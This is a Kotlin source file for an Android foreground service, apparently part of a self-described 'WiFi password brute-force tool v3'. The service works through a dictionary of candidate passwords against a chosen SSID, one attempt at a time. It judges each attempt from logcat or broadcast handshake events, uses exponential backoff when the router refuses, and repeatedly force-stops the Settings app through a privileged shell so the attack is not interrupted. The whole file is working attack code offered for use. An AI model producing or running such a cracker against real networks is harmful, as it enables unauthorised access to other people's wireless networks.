package com.wifi.toolbox.services

import android.app.*
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.os.*
import androidx.annotation.RequiresApi
import androidx.compose.runtime.snapshotFlow
import androidx.core.app.NotificationCompat
import com.wifi.toolbox.*
import com.wifi.toolbox.structs.*
import com.wifi.toolbox.ui.MainActivity
import com.wifi.toolbox.utils.ActivityStack
import com.wifi.toolbox.utils.ApiUtil
import com.wifi.toolbox.utils.ShizukuUtil
import kotlinx.coroutines.*
import kotlin.coroutines.resume
import kotlin.math.pow

class PojieService : Service() {

    val NOTIFICATION_CHANNEL_ID = "PojieServiceChannel"

    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    private var readLogMode = 0
    private var logcatService: WifiLogcatService? = null
    private var broadcastService: WifiBroadcastService? = null

    private var connectWifiApi29Callback: ConnectivityManager.NetworkCallback? = null
    private var lastConnectNetId: Int? = null

    /**
     * 打印日志到全局状态中
     * @param log 日志内容字符串
     */
    fun log(log: String) {
        (applicationContext as MyApplication).logState.addLog(log)
    }

    private lateinit var sharedPreferences: SharedPreferences

    private var _pojieSettings: PojieSettings? = null

    private val pojieSettings: PojieSettings
        get() = _pojieSettings ?: PojieSettings.from(sharedPreferences).also { _pojieSettings = it }

    private val prefsListener = SharedPreferences.OnSharedPreferenceChangeListener { prefs, _ ->
        _pojieSettings = PojieSettings.from(prefs)
    }

    override fun onCreate() {
        super.onCreate()
        sharedPreferences = getSharedPreferences("settings_pojie", MODE_PRIVATE)
        sharedPreferences.registerOnSharedPreferenceChangeListener(prefsListener)
    }

    /**
     * 停止所有正在运行的破解任务并取消当前的协程作业
     */
    fun stopAllTasks() {
        val app = applicationContext as MyApplication
        app.runningPojieTasks.clear()
        currentWorkerJob?.cancel()
    }

    /**
     * 根据最后尝试时间计算任务优先级
     * @param task 破解运行信息对象
     * @return 优先级数值（长整型）
     */
    private fun calculatePriority(task: PojieRunInfo): Long {
        val currentTime = System.currentTimeMillis()
        val timeDiff = currentTime - task.lastTryTime

        val priority = -timeDiff
        return priority
    }

    /**
     * 处理网络日志收集，根据不同的读取模式判定连接结果
     * @param app 全局 Application 实例
     * @param task 当前执行的子任务
     * @param startTime 任务开始时间戳
     * @param connectMode 当前的连接模式
     * @param continuation 协程挂起回调
     */
    private suspend fun CoroutineScope.handleLogCollection(
        app: MyApplication,
        task: SinglePojieTask,
        startTime: Long,
        connectMode: Int,
        continuation: CancellableContinuation<Int>
    ) {
        when (readLogMode) {
            1 -> {
                logcatService?.logFlow?.collect { data ->
                    if (continuation.isActive) {
                        if (connectMode == 3 || (data.ssid == task.ssid && data.eventStartTime >= startTime)) {
                            when (data.event) {
                                WifiLogData.EVENT_WIFI_CONNECTED -> {
                                    if (connectMode != 3) {
                                        continuation.resume(SinglePojieTask.RESULT_SUCCESS)
                                        cancel()
                                    }
                                }

                                WifiLogData.EVENT_CONNECT_FAILED -> {
                                    if (System.currentTimeMillis() - data.eventStartTime > 2000) {
                                        continuation.resume(SinglePojieTask.RESULT_FAILED)
                                        cancel()
                                    }
                                }

                                WifiLogData.EVENT_HANDSHAKE -> {
                                    when (app.pojieConfig.failureFlag) {
                                        1 -> if (data.handshakeUseTime > app.pojieConfig.timeout) {
                                            continuation.resume(SinglePojieTask.RESULT_FAILED)
                                            cancel()
                                        }

                                        2 -> {
                                            if (data.handshakeCount > app.pojieConfig.maxHandshakeCount) {
                                                continuation.resume(SinglePojieTask.RESULT_FAILED)
                                                cancel()
                                            }
                                        }
                                    }
                                }

                                WifiLogData.EVENT_CONNECT_ERROR -> {
                                    continuation.resume(SinglePojieTask.RESULT_ERROR_TRANSIENT)
                                    cancel()
                                }
                            }
                        } else {
                            log("W: 信息不匹配，实际${data.ssid}，应为${task.ssid}，请不要同时连接其他网络")
                        }
                    }
                }
            }

            2 -> {
                if (app.pojieConfig.failureFlag == 2) {
                    throw Exception("广播监听模式不支持按握手次数判定，请在改为“握手超时”或切换为Logcat模式")
                }

                broadcastService?.setTargetSsid(task.ssid)
                broadcastService?.logFlow?.collect { data ->
                    if (continuation.isActive && data.ssid == task.ssid) {
                        when (data.event) {
                            WifiLogData.EVENT_WIFI_CONNECTED -> {
                                if (connectMode != 3) {
                                    continuation.resume(SinglePojieTask.RESULT_SUCCESS)
                                    cancel()
                                }
                            }

                            WifiLogData.EVENT_CONNECT_FAILED -> {
                                continuation.resume(SinglePojieTask.RESULT_FAILED)
                                cancel()
                            }

                            WifiLogData.EVENT_HANDSHAKE -> {
                                if (data.handshakeUseTime > app.pojieConfig.timeout) {
                                    continuation.resume(SinglePojieTask.RESULT_FAILED)
                                    cancel()
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    /**
     * 执行具体的任务逻辑，包括调用系统 API 连接 WiFi 及其超时处理
     * @param app 全局 Application 实例
     * @param task 包含 SSID 和密码的任务信息
     * @return 任务执行结果状态码
     */
    private suspend fun performTaskLogic(app: MyApplication, task: SinglePojieTask): Int {
        val startTime = System.currentTimeMillis()
        val connectMode = pojieSettings.connectMode
        when (connectMode) {
            0 -> throw Exception("连接wifi实现为空，请先去设置中选择")
            1 -> lastConnectNetId = ShizukuUtil.connectToWifi(task.ssid, task.password)
            2 -> {
                lastConnectNetId = ApiUtil.connectToWifiApi28(this, task.ssid, task.password)
                if (lastConnectNetId == -1) throw Exception("请求发送失败，请先手动忘记此网络")
            }

            3 -> {}
            else -> throw Exception("前面的区域，以后再来探索吧(connectMode=${pojieSettings.connectMode})")
        }

        return withTimeoutOrNull(timeMillis = app.pojieConfig.maxTryTime.toLong()) {
            suspendCancellableCoroutine<Int> { continuation ->

                val collectJob = launch {

                    if (connectMode == 3) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            connectWifiApi29Callback =
                                connectToWifiApi29(task.ssid, task.password) { success ->
                                    if (continuation.isActive) {
                                        if (success) {
                                            continuation.resume(SinglePojieTask.RESULT_SUCCESS)
                                            cancel()
                                        } else {
                                            continuation.resume(SinglePojieTask.RESULT_FAILED)
                                            cancel()
                                        }
                                    }
                                }
                        } else throw Exception("系统版本过低，无法使用[连接到设备]连接wifi(sdk<29&connectMode=3)")
                    }

                    handleLogCollection(app, task, startTime, connectMode, continuation)
                }

                continuation.invokeOnCancellation {
                    collectJob.cancel()
                    forgetLastNetwork()
                }
            }
        } ?: SinglePojieTask.RESULT_TIMEOUT
    }

    private var currentWorkerJob: Job? = null

    @Volatile
    private var currentWorkingSsid: String? = null

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    /**
     * 获取格式化的当前系统时间字符串
     * @return 格式为 [HH:mm:ss] 的字符串
     */
    private fun getLogTime(): String {
        val df = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
        return "[${df.format(java.util.Date())}]"
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val app = applicationContext as MyApplication
        try {
            createNotificationChannel()
            val notificationIntent = Intent(this, MainActivity::class.java).apply {
                putExtra("target", "Pojie")
            }
            val pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
            )

            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("密码字典破解服务").setContentText("正在运行")
                .setSmallIcon(R.drawable.ic_launcher_foreground).setContentIntent(pendingIntent)
                .setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build()

            startForeground(1, notification)

            if (currentWorkerJob == null) {
                app.logState.clear()
                log(
                    log = """      _      __                 _        
     | |___ / _|_ __ ___  _   _| |_ __ _ 
  _  | / __| |_| '_ ` _ \| | | | __/ _` |
 | |_| \__ \  _| | | | | | |_| | || (_| |
  \___/|___/_| |_| |_| |_|\__, |\__\__, |
                          |___/    |___/ 
==========================================
wifi密码暴力破解工具 v3 for Android
"""
                )
                readLogMode = pojieSettings.readLogMode
                when (readLogMode) {
                    0 -> throw Exception("读取网络日志实现为空，请先去设置中选择")
                    1 -> {
                        logcatService = WifiLogcatService(pojieSettings)
                        log("Logcat服务已启动")
                    }

                    2 -> {
                        broadcastService = WifiBroadcastService(this)
                        log("广播监听服务已启动")
                    }
                }
                startServiceLogic()
            }
            return START_STICKY
        } catch (e: Exception) {
            stopAllTasks()
            log("E: 服务启动失败")
            log(e.toString())
            stop()
            return START_NOT_STICKY
        }
    }

    /**
     * 停止破解服务，关闭日志监听并销毁服务实例
     */
    private fun stop() {
        log("[运行结束]")
        logcatService?.close()
        broadcastService?.close()
        stopSelf()
    }

    /**
     * 处理破解任务之间的冷却等待逻辑，计算并挂起协程直到下一个任务可用
     * @param app 全局 Application 实例
     * @return 是否成功完成冷却等待
     */
    private suspend fun handleCooldown(app: MyApplication): Boolean {
        val now = System.currentTimeMillis()
        val tasks = app.runningPojieTasks
        if (tasks.isEmpty()) return false

        val nextAvailableTime = tasks.minOf {
            val waitTime = if (it.retryCount > 0) {
                (2.0.pow(it.retryCount.toDouble() - 1).toLong()) * app.pojieConfig.doublingBase
            } else 0L
            it.lastTryTime + waitTime
        }

        val waitMs = maxOf(0L, nextAvailableTime - now)
        if (waitMs > 0) {
            currentWorkerJob = serviceScope.launch {
                log("冷却中，等待${waitMs}ms")
                delay(waitMs)
            }
            try {
                currentWorkerJob?.join()
            } catch (_: CancellationException) {
                return false
            } finally {
                currentWorkerJob = null
            }
        }
        return true
    }

    private fun startServiceLogic() {
        val app = applicationContext as MyApplication

        serviceScope.launch {
            while (isActive) {
                if (pojieSettings.connectMode != 3) ShizukuUtil.executeCommandSync("am force-stop com.android.settings")
                delay(100)
            }
        }

        serviceScope.launch {
            launch {
                snapshotFlow { app.runningPojieTasks.toList() }.collect { currentList ->
                    val targetSsid = currentWorkingSsid
                    if (currentList.isEmpty() || (targetSsid != null && currentList.none { it.ssid == targetSsid })) {
                        currentWorkerJob?.cancel()
                    }
                }
            }

            launch {
                snapshotFlow { app.runningPojieTasks.size }.collect {
                    if (currentWorkingSsid == null) {
                        currentWorkerJob?.cancel()
                    }
                }
            }

            while (isActive) {
                if (app.runningPojieTasks.isEmpty()) {
                    stop()
                    break
                }

                val task = findNextReadyTask(app)
                if (task == null) {
                    handleCooldown(app)
                    continue
                }

                executeTaskAttempt(app, task)
            }
        }
    }

    /**
     * 在当前任务列表中寻找下一个已过冷却时间、可立即执行的任务
     * @param app 全局 Application 实例
     * @return 匹配的任务信息，若所有任务都在冷却中则返回空
     */
    private fun findNextReadyTask(app: MyApplication): PojieRunInfo? {
        val now = System.currentTimeMillis()
        val config = app.pojieConfig
        return app.runningPojieTasks.filter {
            val waitTime = if (it.retryCount > 0) {
                (2.0.pow(it.retryCount.toDouble() - 1).toLong()) * config.doublingBase
            } else 0L
            now - it.lastTryTime >= waitTime
        }.minByOrNull { calculatePriority(it) }
    }

    /**
     * 执行单次破解尝试，包括更新 UI 状态、启动连接任务逻辑及后续结果处理
     * @param app 全局 Application 实例
     * @param task 当前选中的破解任务信息
     */
    private suspend fun executeTaskAttempt(app: MyApplication, task: PojieRunInfo) {
        app.runningPojieTasks.forEach {
            app.updateTaskState(it.ssid) { state ->
                state.copy(textTip = if (it.ssid == task.ssid) "正在尝试..." else "排队中")
            }
        }

        currentWorkingSsid = task.ssid
        val currentPass = task.tryList.getOrNull(task.tryIndex) ?: "未知"

        app.updateTaskState(task.ssid) {
            it.copy(textTip = "正在尝试：$currentPass", lastTryTime = System.currentTimeMillis())
        }

        var taskResult = -1
        log("${getLogTime()} 尝试: (${task.ssid}, $currentPass) ...")

        currentWorkerJob = serviceScope.launch {
            taskResult = try {
                performTaskLogic(app, SinglePojieTask(task.ssid, currentPass))
            } catch (e: Exception) {
                if (e !is CancellationException) log("E: 任务执行出错：${e.message}")
                SinglePojieTask.RESULT_ERROR
            }
        }

        currentWorkerJob?.join()
        handleAttemptResult(app, task, currentPass, taskResult)

        currentWorkingSsid = null
        currentWorkerJob = null
    }

    /**
     * 统一处理单次连接尝试后的结果，更新日志状态、任务进度及错误重试逻辑
     * @param app 全局 Application 实例
     * @param task 尝试的任务信息
     * @param pass 本次尝试使用的密码
     * @param result 连接任务返回的状态码
     */
    private fun handleAttemptResult(
        app: MyApplication, task: PojieRunInfo, pass: String, result: Int
    ) {
        val timeTag = getLogTime()
        val isCancelled = currentWorkerJob?.isCancelled == true

        if (isCancelled) {
            app.logState.setLine("$timeTag 尝试: (${task.ssid}, $pass) 结果: 任务中断")
            app.finishedPojieTasksTip[task.ssid] = "任务中断(index=${task.tryIndex})"
            forgetLastNetwork()
        } else if (result != SinglePojieTask.RESULT_ERROR) {
            val resultStr = when (result) {
                SinglePojieTask.RESULT_SUCCESS -> "连接成功"
                SinglePojieTask.RESULT_FAILED -> "失败"
                SinglePojieTask.RESULT_TIMEOUT -> "执行超时"
                SinglePojieTask.RESULT_ERROR_TRANSIENT -> "路由器拒绝接入"
                else -> "未知错误"
            }
            app.logState.setLine("$timeTag 尝试: (${task.ssid}, $pass) 结果: $resultStr")
        } else {
            app.finishedPojieTasksTip[task.ssid] = "执行出错，请查看输出"
        }

        cleanupConnectionResources()

        when (result) {
            SinglePojieTask.RESULT_SUCCESS -> {
                log("连接成功: (${task.ssid}, $pass)")
                app.finishedPojieTasksTip[task.ssid] = "连接成功：$pass"
                app.stopTaskByName(task.ssid)
            }

            SinglePojieTask.RESULT_FAILED -> {
                processTaskCompletion(app, task.ssid)
                app.updateTaskState(task.ssid) { it.copy(retryCount = 0) }
            }

            SinglePojieTask.RESULT_ERROR -> {
                app.stopTaskByName(task.ssid)
            }

            SinglePojieTask.RESULT_TIMEOUT, SinglePojieTask.RESULT_ERROR_TRANSIENT -> {
                app.updateTaskState(task.ssid) { it.copy(retryCount = it.retryCount + 1) }
                getTask(app, task.ssid)?.let { updated ->
                    if (app.pojieConfig.retryCountType <= 5 && updated.retryCount > app.pojieConfig.retryCountType) {
                        app.updateTaskState(task.ssid) { it.copy(retryCount = 0) }
                        processTaskCompletion(app, task.ssid)
                    }
                }
            }
        }
    }

    /**
     * 清理连接过程中占用的系统资源，包括取消 API 29 回调或断开当前 Wi-Fi 连接
     */
    private fun cleanupConnectionResources() {
        if (connectWifiApi29Callback != null) {
            ApiUtil.cancelWifiRequest(this, connectWifiApi29Callback!!)
            connectWifiApi29Callback = null
        } else {
            when (pojieSettings.enableMode) {
                1 -> ShizukuUtil.disconnectWifi()
                2 -> ApiUtil.disconnectWifi(this)
            }
        }
    }

    /**
     * 尝试移除/忘记最后一次连接的网络配置
     */
    private fun forgetLastNetwork() {
        lastConnectNetId?.let {
            when (pojieSettings.connectMode) {
                1 -> ShizukuUtil.forgetNetwork(it)
                2 -> ApiUtil.forgetNetwork(this@PojieService, it)
            }
            lastConnectNetId = null
        }
    }

    /**
     * 从当前运行列表中获取指定 SSID 的任务信息
     * @param app 全局 Application 实例
     * @param ssid WiFi 名称
     * @return 匹配的任务信息，若无则返回空
     */
    private fun getTask(app: MyApplication, ssid: String): PojieRunInfo? {
        return app.runningPojieTasks.find { it.ssid == ssid }
    }

    /**
     * 处理单个密码尝试完成后的状态更新，判定是否继续下一个密码或结束任务
     * @param app 全局 Application 实例
     * @param ssid WiFi 名称
     */
    private fun processTaskCompletion(app: MyApplication, ssid: String) {
        val task = getTask(app, ssid) ?: return
        val nextIndex = task.tryIndex + 1

        if (nextIndex >= task.tryList.size) {
            forgetLastNetwork()
            app.finishedPojieTasksTip[ssid] = "全部尝试失败(size=${task.tryList.size})"
            app.stopTaskByName(ssid)
        } else {
            app.updateTaskState(ssid) {
                it.copy(tryIndex = nextIndex)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        sharedPreferences.unregisterOnSharedPreferenceChangeListener(prefsListener)
        stopForeground(STOP_FOREGROUND_REMOVE)
        serviceScope.cancel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID, "密码字典破解服务", NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }

    /**
     * 适配 Android 10+ 的 WiFi 连接 API
     * @param ssid WiFi 名称
     * @param pass WiFi 密码
     * @param callback 连接结果回调
     * @return 网络回调实例
     */
    @RequiresApi(Build.VERSION_CODES.Q)
    private suspend fun connectToWifiApi29(
        ssid: String, pass: String, callback: (Boolean) -> Unit
    ): ConnectivityManager.NetworkCallback? {
        val foregroundActivity = ActivityStack.get()

        return if (foregroundActivity != null) {
            withContext(Dispatchers.Main) {
                ApiUtil.connectToWifiApi29(foregroundActivity, ssid, pass, callback)
            }
        } else {
            ApiUtil.connectToWifiApi29(this, ssid, pass, callback)
        }
    }
}